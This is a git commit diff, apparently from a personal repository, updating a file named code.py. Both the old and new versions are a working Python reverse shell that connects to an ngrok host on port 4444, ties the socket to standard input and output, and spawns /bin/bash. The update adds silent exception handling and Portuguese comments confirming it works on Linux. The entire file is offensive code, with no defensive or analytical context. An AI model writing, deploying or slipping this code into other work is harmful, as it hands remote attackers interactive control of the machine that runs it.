9bd6367027eb6c90b628bbf9ad8b88933cf89e38
YuriCyberDeveloper <66189089+YuriDev1669@users.noreply.github.com>
2025-12-13 22:54:42 -0300

    Update code.py

--- code.py
+++ code.py
@@ -1,11 +1,25 @@
 import socket
-import subprocess
 import os
 import pty
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("0098e90c3898.ngrok-free.app", 4444))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-pty.spawn("/bin/bash")
+HOST = "0098e90c3898.ngrok-free.app"  # Corrigido: sem https://
+PORT = 4444
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((HOST, PORT)) 
+    
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    
+    # O Linux tem /bin/bash, então isso funciona perfeitamente lá.
+    pty.spawn("/bin/bash") 
+    
+except Exception as e:
+    pass
+finally:
+    try:
+        s.close()
+    except:
+        pass
